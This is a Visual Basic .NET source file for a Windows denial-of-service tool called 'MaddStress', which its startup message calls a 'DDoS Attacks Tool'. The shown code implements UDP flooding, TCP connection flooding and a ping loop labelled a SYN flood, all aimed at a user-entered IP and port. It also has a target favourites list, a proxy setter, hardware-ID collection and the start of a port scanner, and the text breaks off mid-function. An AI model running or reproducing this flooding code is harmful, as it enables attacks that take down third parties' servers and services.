Imports System.Net
Imports System.ComponentModel
Imports System.Net.Sockets
Imports System.Net.NetworkInformation
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Management


Public Class MainHome


    Dim CPU As Integer
    Dim RAM As Integer

    Dim Domains(16)

    Dim Star As New System.Net.WebClient
    Dim Api As String = ("https://tools.drweabo.com/api/send.php")


    '<------------------ USE PROXY ------------------>'

    <Runtime.InteropServices.DllImport("wininet.dll", SetLastError:=True)>
    Private Shared Function InternetSetOption(ByVal hInternet As IntPtr, ByVal dwOption As Integer, ByVal lpBuffer As IntPtr, ByVal lpdwBufferLength As Integer) As Boolean
    End Function


    Public Structure Struct_INTERNET_PROXY_INFO
        Public dwAccessType As Integer
        Public proxy As IntPtr
        Public proxyBypass As IntPtr
    End Structure


    Private Sub UseProxy(ByVal strProxy As String)
        Const INTERNET_OPTION_PROXY As Integer = 38
        Const INTERNET_OPEN_TYPE_PROXY As Integer = 3

        Dim struct_IPI As Struct_INTERNET_PROXY_INFO

        struct_IPI.dwAccessType = INTERNET_OPEN_TYPE_PROXY
        struct_IPI.proxy = Marshal.StringToHGlobalAnsi(strProxy)
        struct_IPI.proxyBypass = Marshal.StringToHGlobalAnsi("local")

        Dim intptrStruct As IntPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(struct_IPI))

        Marshal.StructureToPtr(struct_IPI, intptrStruct, True)

        Dim iReturn As Boolean = InternetSetOption(IntPtr.Zero, INTERNET_OPTION_PROXY, intptrStruct, System.Runtime.InteropServices.Marshal.SizeOf(struct_IPI))
    End Sub

    '<------------------ USE PROXY ------------------>'


    '<------------------ GET YOUR COUNTRY LOCATE ------------------>'

    <DllImport("kernel32.dll")>
    Private Shared Function GetLocaleInfo(ByVal Locale As UInteger, ByVal LCType As UInteger, <Out()> ByVal lpLCData As System.Text.StringBuilder, ByVal cchData As Integer) As Integer
    End Function


    Private Const LOCALE_SYSTEM_DEFAULT As UInteger = &H400
    Private Const LOCALE_SENGCOUNTRY As UInteger = &H1002


    Private Shared Function GetInfo(ByVal lInfo As UInteger) As String

        Dim lpLCData = New System.Text.StringBuilder(256)
        Dim ret As Integer = GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, lInfo, lpLCData, lpLCData.Capacity)
        If ret > 0 Then
            Return lpLCData.ToString().Substring(0, ret - 1)
        End If
        Return String.Empty

    End Function


    Public Shared Function GetLetters()

        Dim MyCountry As String = (GetInfo(LOCALE_SENGCOUNTRY))
        Return MyCountry

    End Function

    '<------------------ GET YOUR COUNTRY LOCATE ------------------>'


    Private Class clsComputerInfo
        ' Get processor ID
        Friend Function GetProcessorId() As String
            Dim strProcessorID As String = String.Empty
            Dim query As New SelectQuery("Win32_processor")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strProcessorID = info("processorID").ToString()
            Next
            Return strProcessorID
        End Function


        ' Get MAC Address
        Friend Function GetMACAddress() As String
            Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
            Dim moc As ManagementObjectCollection = mc.GetInstances()
            Dim MacAddress As String = String.Empty
            For Each mo As ManagementObject In moc
                If (MacAddress.Equals(String.Empty)) Then
                    If CBool(mo("IPEnabled")) Then MacAddress = mo("MacAddress").ToString()
                    mo.Dispose()
                End If
                MacAddress = MacAddress.Replace(":", String.Empty)
            Next
            Return MacAddress
        End Function


        ' Get Motherboard ID
        Friend Function GetMotherboardID() As String
            Dim strMotherboardID As String = String.Empty
            Dim query As New SelectQuery("Win32_BaseBoard")
            Dim search As New ManagementObjectSearcher(query)
            Dim info As ManagementObject
            For Each info In search.Get()
                strMotherboardID = info("product").ToString()
            Next
            Return strMotherboardID
        End Function


        ' Encrypt HWID
        Friend Function getMD5Hash(ByVal strToHash As String) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As String = ""
            For Each b As Byte In bytesToHash
                strResult += b.ToString("x2")
            Next
            Return strResult
        End Function
    End Class


    Private Sub MainHome_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

        'Form Shadow
        Guna.UI.Lib.GraphicsHelper.ShadowForm(Me)
        Guna.UI.Lib.GraphicsHelper.DrawLineShadow(MainPanelTop, Color.Black, 20, 5, Guna.UI.WinForms.VerHorAlign.HorizontalBottom)

        'Check Internet Connection
        Try
            Using Client = New System.Net.WebClient()
                Using Stream = Client.OpenRead("https://google.com")

                    'Start Here
                    DisplayFadeIn(Me)
                    CheckForIllegalCrossThreadCalls = False
                    Methods.updateFavorites()
                    Methods.updateHistory()
                    Methods.updateTF()
                    Methods.DefaultSetUp()
                    MainTimerHOME.Interval = My.Settings.DAUL
                    MainTimerHOME.Start()

                    MsgBox("Welcome to MaddStress Best DDoS Attacks Tools - Coder by DrWeabo", MsgBoxStyle.Information, "")
                    MsgBox("Make a donation now, donating won't make you poor. Thank you!", MsgBoxStyle.Information)

                    MainTextCOMPUTERNAME.Text = My.Computer.Name.ToString
                    MainTextCOMPUTEROS.Text = My.Computer.Info.OSFullName.ToString
                    MainTextMYIP.Text = GetMYIP()
                    MainTextNEWS.Text = GetNEWS()
                    MainTextCOUNTRY.Text = (GetInfo(LOCALE_SENGCOUNTRY))

                    addHistoryItem("[SYSTEM] Welcome to MaddStress")

                    GetUPDATES()

                End Using
            End Using
        Catch ex As Exception
            MsgBox("Your not connected to Internet, please try again & connect to internet!", MsgBoxStyle.Critical, "")
            Application.ExitThread()
        End Try

    End Sub


    Private Sub GetUPDATES()

        'Check for Updates
        Dim Request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create("https://paste.drweabo.xyz/paste.php?raw&id=139")
        Dim Response As System.Net.HttpWebResponse = Request.GetResponse()
        Dim Maddog As System.IO.StreamReader = New System.IO.StreamReader(Response.GetResponseStream())
        Dim NewestVersion As String = Maddog.ReadToEnd()
        Dim CurrentVersion As String = Application.ProductVersion
        If NewestVersion.Contains(CurrentVersion) Then
            MainButtonUPDATES.Visible = False
            'Message (You are already using the latest version)
        Else
            MsgBox("New version available, please download new version.", MsgBoxStyle.Exclamation, "")
            MainButtonUPDATES.Visible = True
        End If

    End Sub


    Function GetMYIP() As String

        Dim IP As New WebClient
        Return IP.DownloadString("https://tools.feron.it/php/ip.php")

    End Function


    Function GetNEWS() As String

        Dim INFO As New WebClient
        Return INFO.DownloadString("https://paste.drweabo.xyz/paste.php?raw&id=138")

    End Function


    Public Shared Sub DisplayFadeIn(ByVal Form As Object)

        For FadeIn = 0.0 To 1.1 Step 0.1
            Form.Opacity = FadeIn
            Form.Refresh()
            Threading.Thread.Sleep(100)
        Next

    End Sub


    Public Shared Sub DisplayFadeOut(ByVal Form As Object)

        For FadeOut = 90 To 10 Step -10
            Form.Opacity = FadeOut / 100
            Form.Refresh()
            Threading.Thread.Sleep(50)
        Next
        My.Settings.Save()
        Form.Close()

    End Sub


    Private Sub MainControlBoxClose_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainControlBoxClose.Click

        DisplayFadeOut(Me)
        End

    End Sub


    Dim UDPFlooding As Boolean = False
    Dim UDPFloods As Integer = 0
    Dim UDPFailedFloods As Integer = 0


    Private Sub MainBWUDP_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles MainBWUDP.DoWork

        Dim Target As IPAddress = IPAddress.Parse(MainTextUDPTARGET.Text)
        Dim IPEP As New IPEndPoint(Target, Convert.ToInt32(MainTextUDPPORT.Text))
        Dim Packet As Byte() = New Byte(MainTextUDPPACKETS.Text) {}
        Dim Socket As Integer = MainTextUDPSOCKETS.Text
        Dim UDPClient As New UdpClient
        Dim FloodData As Byte()
        FloodData = System.Text.Encoding.ASCII.GetBytes("ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORINGITS RA1NING ITS POURING THE SERVERS ARE SNORING ITS RA1NING ITS POURING THE SERVERS ARE SNORING")
        Do While UDPFlooding = True
            For i = 0 To Socket
                If UDPFlooding = True Then
                    Dim SOCK(i) As Socket
                    SOCK(i) = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                    For x = 0 To 5
                        Try
                            SOCK(i).SendTo(Packet, IPEP)
                            UDPClient.Connect(Target, MainTextUDPPORT.Text)
                            UDPClient.Send(FloodData, FloodData.Length)
                            Threading.Thread.Sleep(MainTrackUDPSPEED.Value)
                            My.Settings.TotalFloods += 1
                            UDPFloods += 1
                            MainTimerPROXY.Start()
                            MainLabelUDPFLOOD.Text = "Floods: " & UDPFloods
                            MainLabelTOTALFLOOD.Text = "Total Floods: " & My.Settings.TotalFloods
                        Catch ex As Exception
                            UDPFailedFloods += 1
                            MainLabelFAILFLOOD.Text = "Failed Floods: " & UDPFailedFloods
                            Threading.Thread.Sleep(MainTrackUDPSPEED.Value)
                        End Try
                    Next
                Else
                    Exit Do
                End If
            Next
        Loop

    End Sub


    Private Sub MainTrackUDPSPEED_Scroll(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainTrackUDPSPEED.Scroll

        MainLabelUDPSPEED.Text = "Speed: " + MainTrackUDPSPEED.Value.ToString()

    End Sub


    Private Sub MainButtonUDPSTART_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonUDPSTART.Click

        If MainTextUDPTARGET.Text <> Nothing And MainTextUDPPACKETS.Text <> Nothing And MainTextUDPPORT.Text <> Nothing And MainTextUDPSOCKETS.Text <> Nothing Then
            UDPFlooding = True
            MainTimerPROXY.Start()
            If Not MainBWUDP.IsBusy Then
                MainBWUDP.RunWorkerAsync()
            End If
        End If

    End Sub


    Private Sub MainButtonUDPSTOP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonUDPSTOP.Click

        MainTimerPROXY.Stop()
        UDPFlooding = False
        If MainBWUDP.IsBusy Then
            MainBWUDP.CancelAsync()
            addHistoryItem("Sent " & UDPFloods & " UDP floods to " & MainTextUDPTARGET.Text)
            UDPFloods = 0
        End If
        My.Settings.Save()

    End Sub


    Private Sub MainButtonADDFAVORITES_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonADDFAVORITES.Click

        If MainTextFavIP.Text = Nothing Or MainTextFavName.Text = Nothing Or MainTextFavNotes.Text = Nothing Then
            MsgBox("Please fill out all the forms.")
            Return
        End If
        My.Settings.FavIP.Add(MainTextFavIP.Text)
        My.Settings.FavName.Add(MainTextFavName.Text)
        My.Settings.FavNotes.Add(MainTextFavNotes.Text)
        Methods.updateFavorites()

    End Sub


    Private Sub MainHome_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize

        Me.Width = 1300
        Me.Height = 900

    End Sub


    Private Sub MainButtonCONVERT_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonCONVERT.Click

        If MainTextURLTOIP.Text <> Nothing Then
            Dim Hostname = Dns.GetHostEntry(MainTextURLTOIP.Text)
            Dim IP As IPAddress() = Hostname.AddressList
            If IP(0).ToString.Contains(":") Then
                MsgBox("Invalid URL!")
                Return
            End If
            MainTextRESULTIP.Text = IP(0).ToString
            Clipboard.SetText(IP(0).ToString)
            Methods.addHistoryItem(MainTextURLTOIP.Text & " was converted to " & IP(0).ToString)
        End If

    End Sub


    Private Sub MainButtonADDTOFAVORITES2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonADDTOFAVORITES2.Click

        If MainTextURLTOIP.Text <> Nothing Or MainTextRESULTIP.Text <> Nothing Then
            Dim Hostname = Dns.GetHostEntry(MainTextURLTOIP.Text)
            Dim ip As IPAddress() = Hostname.AddressList
            If ip(0).ToString.Contains(":") Then
                MsgBox("Invalid URL!")
                Return
            Else
                MainTextRESULTIP.Text = ip(0).ToString
                Clipboard.SetText(ip(0).ToString)
                Methods.addFavoriteItem(MainTextRESULTIP.Text, MainTextURLTOIP.Text, "This was added automatically")
            End If
        End If

    End Sub


    Dim TCPFlooding As Boolean = False
    Dim TCPFloods As Integer = 0
    Dim TCPFailedFloods As Integer = 0


    Private Sub MainBWTCP_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles MainBWTCP.DoWork

        Dim Target As IPAddress = IPAddress.Parse(MainTextTCPTARGET.Text)
        Dim IPEP As New IPEndPoint(Target, Convert.ToInt32(MainTextTCPPORT.Text))
        Dim Packet As Byte() = New Byte(MainTextTCPPACKETS.Text) {}
        Dim Socket As Integer = MainTextTCPSOCKETS.Text
        Dim TCPClient As New TcpClient
        Do While TCPFlooding = True
            For i = 0 To Socket
                If TCPFlooding = True Then
                    Try
                        TCPClient.Connect(Target, MainTextTCPPORT.Text)
                        TCPClient.EndConnect(Target)
                        TCPClient.Close()
                        My.Settings.TotalFloods += 1
                        TCPFloods += 1
                        MainTimerPROXY.Start()
                        MainLabelTCPFLOOD.Text = "Floods: " & TCPFloods
                        MainLabelTOTALFLOOD.Text = "Total Floods: " & My.Settings.TotalFloods
                        Threading.Thread.Sleep(MainTrackTCPSPEED.Value)
                    Catch ex As Exception
                        My.Settings.TotalFloods += 1
                        TCPFailedFloods += 1
                        TCPFloods += 1
                        MainLabelTCPFLOOD.Text = "Floods: " & TCPFloods
                        MainLabelTOTALFLOOD.Text = "Total Floods: " & My.Settings.TotalFloods
                        Threading.Thread.Sleep(MainTrackTCPSPEED.Value)
                    End Try
                Else
                    Exit Do
                End If
            Next
        Loop

    End Sub


    Private Sub MainButtonTCPSTOP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonTCPSTOP.Click

        MainTimerPROXY.Stop()
        TCPFlooding = False
        If MainBWTCP.IsBusy Then
            MainBWTCP.CancelAsync()
            Methods.addHistoryItem("Sent " & TCPFloods & " TCP floods to " & MainTextTCPTARGET.Text)
            TCPFloods = 0
        End If
        My.Settings.Save()

    End Sub


    Private Sub MainButtonTCPSTART_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonTCPSTART.Click

        If MainTextTCPTARGET.Text <> Nothing And MainTextTCPPACKETS.Text <> Nothing And MainTextTCPPORT.Text <> Nothing And MainTextTCPSOCKETS.Text <> Nothing Then
            TCPFlooding = True
            MainTimerPROXY.Start()
            If Not MainBWTCP.IsBusy Then
                MainBWTCP.RunWorkerAsync()
            End If
        End If

    End Sub


    Private Sub MainComboFAVORITES_SelectedIndexChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles MainComboFAVORITES.SelectedIndexChanged

        Dim a As Integer = MainComboFAVORITES.SelectedIndex
        MainTextTCPTARGET.Text = My.Settings.FavIP.Item(a)
        MainTextUDPTARGET.Text = My.Settings.FavIP.Item(a)
        MainTextSYNTARGET.Text = My.Settings.FavIP.Item(a)
        MainTextIPPORTSCANNER.Text = My.Settings.FavIP.Item(a)

    End Sub


    Private Sub MainButtonSETDEFAULT_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonSETDEFAULT.Click

        Try
            My.Settings.DPort = Convert.ToInt32(MainTextSETPORT.Text)
            My.Settings.DPackets = Convert.ToInt32(MainTextSETPACKETS.Text)
            My.Settings.DSockets = Convert.ToInt32(MainTextSETSOCKETS.Text)
            My.Settings.DBytes = Convert.ToInt32(MainTextSETBYTES.Text)
            My.Settings.DAUL = Convert.ToInt32(MainTextSETAUTOUPDATE.Text)
            DefaultSetUp()
            My.Settings.Save()
        Catch ex As Exception
            MsgBox("Error: Please make sure all fields are integers")
        End Try

    End Sub


    Dim SYNFlooding As Boolean = False
    Dim SYNFloods As Integer = 0
    Dim SYNBytesS As Integer = 0


    Private Sub MainBWSYN_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles MainBWSYN.DoWork

        Do While SYNFlooding = True
            My.Computer.Network.Ping(MainTextSYNTARGET.Text)
            SYNFloods += 1
            MainLabelSYNFLOOD.Text = "Floods: " & SYNFloods
            SYNBytesS += MainTextSYNBYTES.Text
            MainLabelSYNBYTES.Text = "Bytes sent: " & SYNBytesS
            My.Settings.TotalFloods += 1
            MainTimerPROXY.Start()
            MainLabelTOTALFLOOD.Text = My.Settings.TotalFloods
            Threading.Thread.Sleep(Convert.ToInt32(MainTextSYNBYTES.Text) * 0.75)
        Loop

    End Sub


    Private Sub MainButtonSYNSTART_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonSYNSTART.Click

        If MainTextSYNTARGET.Text <> Nothing And MainTextSYNBYTES.Text <> Nothing Then
            If Convert.ToInt32(MainTextSYNBYTES.Text) > 65000 Then
                MsgBox("Please use under 65,000 bytes per flood.")
                Return
            End If
            SYNFlooding = True
            MainTimerPROXY.Start()
            If Not MainBWSYN.IsBusy Then
                MainBWSYN.RunWorkerAsync()
            End If
        End If

    End Sub


    Private Sub MainButtonSYNSTOP_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonSYNSTOP.Click

        MainTimerPROXY.Stop()
        SYNFlooding = False
        If MainBWSYN.IsBusy Then
            MainBWSYN.CancelAsync()
            Methods.addHistoryItem("Sent " & SYNFloods & " SYN floods to " & MainTextSYNTARGET.Text & ", " & MainTextSYNBYTES.Text & "bytes each")
            SYNFloods = 0
        End If
        My.Settings.Save()

    End Sub


    Private Sub MainTrackTCPSPEED_Scroll(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainTrackTCPSPEED.Scroll

        MainLabelTCPSPEED.Text = "Speed: " + MainTrackTCPSPEED.Value.ToString()

    End Sub


    Dim IsScanning As Boolean = False


    Private Sub MainButtonPORTSCAN_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MainButtonPORTSCAN.Click

        If IsScanning = False Then
            IsScanning = True
            If Not MainBWTHREAD.IsBusy Then
                MainBWTHREAD.RunWorkerAsync()
                MainButtonPORTSCAN.Text = "Stop"
            End If
        Else
            IsScanning = False
            If MainBWTHREAD.IsBusy Then
                MainBWTHREAD.CancelAsync()
                MainButtonPORTSCAN.Text = "Scan"
            End If
        End If

    End Sub


    Private Sub ScanPort(ByVal Port As Integer)

        Try
            Dim tmpClient As New TcpClient()
